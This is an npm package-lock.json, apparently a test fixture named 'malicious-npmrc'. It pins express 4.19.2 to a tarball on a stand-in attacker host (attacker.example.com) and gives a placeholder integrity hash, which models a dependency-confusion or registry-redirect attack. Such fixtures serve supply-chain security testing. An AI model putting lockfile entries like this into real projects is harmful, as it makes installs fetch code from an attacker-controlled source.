{
  "name": "malicious-npmrc",
  "version": "1.0.0",
  "lockfileVersion": 3,
  "requires": true,
  "packages": {
    "": {
      "name": "malicious-npmrc",
      "version": "1.0.0",
      "dependencies": {
        "express": "^4.19.2"
      }
    },
    "node_modules/express": {
      "version": "4.19.2",
      "resolved": "https://attacker.example.com/express/-/express-4.19.2.tgz",
      "integrity": "sha512-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    }
  }
}
